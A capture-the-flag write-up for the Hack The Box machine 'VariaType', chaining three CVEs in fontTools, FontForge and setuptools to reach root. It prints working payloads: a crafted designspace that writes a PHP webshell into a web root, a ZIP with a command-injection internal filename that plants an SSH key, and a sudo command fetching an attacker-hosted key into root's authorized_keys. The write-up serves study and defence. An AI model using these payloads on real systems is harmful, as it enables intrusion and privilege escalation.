## Summary

VariaType is a Medium Linux machine built around a font-processing workflow. The
main site `variatype.htb` runs a Flask **variable-font generator** that builds
fonts with `fontTools`; a sibling vhost `portal.variatype.htb` is a PHP portal
that leaks its source through an exposed `.git` directory. The generator is
vulnerable to **CVE-2025-66034** (a `fontTools` `varLib` arbitrary file write via
the `.designspace` parser): a crafted designspace writes its output to an
arbitrary path while smuggling a PHP webshell inside an axis `<labelname>` CDATA
section, yielding RCE as `www-data` in the portal web root. A `steve` cron job
feeds uploaded archives to a vulnerable **FontForge** build (**CVE-2024-25082**,
command injection via an archive's internal filename), which is abused to plant
an SSH key and pivot to **steve**. Finally, `steve` may run a setuptools-based
installer with `sudo`; **CVE-2025-47273** (a `PackageIndex` path traversal in
setuptools 78.1.0) writes an attacker key into `/root/.ssh/authorized_keys` for
**root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| VariaType | Medium | Linux | Hack The Box |

## Attack Path

1. Nmap reveals SSH (22) and HTTP (80, nginx).
2. The web root redirects to `variatype.htb`; vhost fuzzing finds `portal.variatype.htb`.
3. `portal.variatype.htb` exposes a `.git` directory disclosing the portal source.
4. The font generator on `variatype.htb` processes `.designspace` files with `fontTools` 4.50.0 (CVE-2025-66034).
5. A malicious designspace writes a PHP webshell into the portal web root → RCE as `www-data`.
6. A `steve` cron (`*/2`) validates only the *outer* filename, then opens uploaded archives with a vulnerable FontForge build.
7. A ZIP whose *internal* filename contains a command substitution (CVE-2024-25082) runs as `steve` and plants an SSH key.
8. `steve` has `sudo` on a setuptools "plugin installer"; CVE-2025-47273 writes an SSH key to root's home.
9. SSH as `root`.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.129.244.202
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.2p1 (Debian) |
| 80 | HTTP | nginx 1.22.1 |

`http://10.129.244.202/` returns `301 → http://variatype.htb/`, so the host was
added to `/etc/hosts`. Virtual-host fuzzing on the `Host` header revealed a
second name, `portal.variatype.htb`:

```
10.129.244.202  variatype.htb portal.variatype.htb
```

## Web Enumeration

`variatype.htb` is **"VariaType Labs — Variable Font Generator"**, a Flask app.
Its single tool lives at `/tools/variable-font-generator` and accepts a
multipart POST to `/tools/variable-font-generator/process`:

```html
<form method="POST" enctype="multipart/form-data"
      action="/tools/variable-font-generator/process">
  <input type="file" name="designspace" accept=".designspace" required>
  <input type="file" name="masters" multiple accept=".ttf,.otf" required>
</form>
```

The app saves the uploaded `.designspace` plus master fonts to a working
directory and builds a variable font with `fontTools.varLib`, returning a random
`/download/<token>` link on success.

`portal.variatype.htb` is a separate PHP application that exposes a Git
repository:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://portal.variatype.htb/.git/HEAD   # 200
git-dumper http://portal.variatype.htb/.git/ portal_src
```

Reviewing the commit history reveals hardcoded credentials that were "removed" in
a later commit (`gitbot` / a `G1tB0t_*` password), confirming the portal as the
intended web root that the font generator can write into:
`/var/www/portal.variatype.htb/public/`.

## Foothold — CVE-2025-66034 (fontTools designspace arbitrary write)

`fontTools` 4.50.0 (vulnerable range 4.33.0 – 4.60.1) lets a `.designspace`
control the output path of a built variable font through the
`<variable-font filename="...">` attribute, which honours directory traversal
and absolute paths. The contents written are a real binary font — but PHP will
execute any `<?php ... ?>` block found anywhere inside that binary. Embedding the
webshell in an axis `<labelname>` (preserved verbatim in the output font's name
table) turns the generated font into a working PHP file.

`evil.designspace`:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php echo shell_exec($_REQUEST["cmd"]);?>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="Super Pandora.ttf" name="Light">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="Mal" filename="/var/www/portal.variatype.htb/public/shell.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
  <instances>
    <instance name="Thin" familyname="MyFont" stylename="Thin">
      <location><dimension name="Weight" xvalue="100"/></location>
      <labelname xml:lang="en">Thin</labelname>
    </instance>
  </instances>
</designspace>
```

Upload it with a valid master font, then trigger the webshell:

```bash
curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \
  -F "designspace=@evil.designspace;type=application/xml" \
  -F "masters=@Super Pandora.ttf;type=font/ttf"

curl -s "http://portal.variatype.htb/shell.php" --data-urlencode "cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The PHP echoes the leading font bytes verbatim and then executes the embedded
command, giving RCE as `www-data`.

## Lateral Movement — CVE-2024-25082 (FontForge command injection) → steve

`www-data` can write to `/var/www/portal.variatype.htb/public/files`
(`drwxrwsr-x www-data www-data`). A `steve` cron runs every two minutes:

```bash
*/2 * * * * /home/steve/bin/process_client_submissions.sh
```

The script enforces a strict naming policy — but only on the **outer** filename:

```bash
SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'
# ...
font = fontforge.open('$file')   # FontForge custom build, ~20230101
```

When FontForge opens an *archive*, it shells out using the archive's **internal**
filename without sanitisation (CVE-2024-25082). A ZIP named `submission.zip`
passes the outer regex, while its inner entry carries the payload:

```python
import zipfile, base64
payload = ("mkdir -p /home/steve/.ssh && echo '<ATTACKER_PUBKEY>' >> "
           "/home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && "
           "chmod 600 /home/steve/.ssh/authorized_keys")
b64 = base64.b64encode(payload.encode()).decode()
arc = f"$(echo {b64}|base64 -d|bash).ttf"
with zipfile.ZipFile("submission.zip", "w", zipfile.ZIP_DEFLATED) as z:
    z.write("Super Pandora.ttf", arcname=arc)
```

Drop it into the watched directory via the webshell. On the next cron tick the
substitution runs as `steve` and installs the SSH key:

```bash
ssh -i steve_id steve@10.129.244.202
cat /home/steve/user.txt
```

## Privilege Escalation — CVE-2025-47273 (setuptools path traversal) → root

`steve` has a passwordless `sudo` entry:

```
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

The script downloads a "plugin" with setuptools' `PackageIndex.download()`:

```python
from setuptools.package_index import PackageIndex
index = PackageIndex()
index.download(plugin_url, "/opt/font-tools/validators")
```

setuptools 78.1.0 is vulnerable to **CVE-2025-47273**. The destination filename is
derived from the URL's last path segment and joined onto the target directory.
A `../`-based payload is neutralised (the code rewrites `..` → `.`), but an
**absolute path** is not — `os.path.join(target, "/root/.ssh/authorized_keys")`
collapses to `/root/.ssh/authorized_keys`. The validator also restricts URLs to
`http(s)` with a netloc and to at most ten `/` characters, both satisfied by
URL-encoding the traversal (`%2F`).

Host the attacker public key on a simple HTTP server that returns it for any
path, then run the installer:

```bash
# attacker: serve the pubkey on tun0:8000 for any request path
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  'http://10.10.14.6:8000/%2Froot%2F.ssh%2Fauthorized_keys'
# [+] Plugin installed at: /root/.ssh/authorized_keys

ssh -i steve_id root@10.129.244.202
id   # uid=0(root)
cat /root/root.txt
```

## Vulnerability Analysis

- **CVE-2025-66034 (fontTools varLib arbitrary file write):** the `.designspace`
  `<variable-font filename>` is trusted as the output path (traversal/absolute),
  and axis label strings are copied verbatim into the output, so a binary font
  can carry an executable PHP payload.
- **CVE-2024-25082 (FontForge archive command injection):** `splinefont` builds a
  shell command from an archive's internal member name. Outer-filename
  allow-listing is irrelevant because the dangerous value lives *inside* the ZIP.
- **CVE-2025-47273 (setuptools PackageIndex path traversal):** download filenames
  are not safely sanitised; absolute paths escape the target directory entirely,
  enabling arbitrary write as the `sudo` user.
- **Defence in depth failures:** exposed `.git`, secrets only "soft-deleted" in
  Git history, a privileged installer trusting a remote URL, and a cron that
  validates the wrong attribute.

## Tools Used

- `nmap` — port and service discovery
- `ffuf` — virtual-host enumeration
- `git-dumper` — recover the exposed portal repository
- `fonttools` — craft / validate `.designspace` and master fonts
- `curl` — drive the generator, webshell, and HTTP key-serving
- `python3` (`zipfile`) — build the malicious archive
- `ssh` / `ssh-keygen` — key plant and access

## Key Takeaways

- File-conversion and font-build pipelines are rich attack surface: parsers
  honour paths and names that look like harmless metadata.
- An output that "must be a valid font" is not a safe output — PHP (and many
  loaders) execute payloads embedded in otherwise-binary files.
- Input validation must target the value that actually reaches the dangerous
  sink; here the injection lived inside an archive, past the filename check.
- Privileged helpers that fetch remote resources inherit every path-traversal and
  SSRF bug in their download libraries — pin versions and constrain destinations.
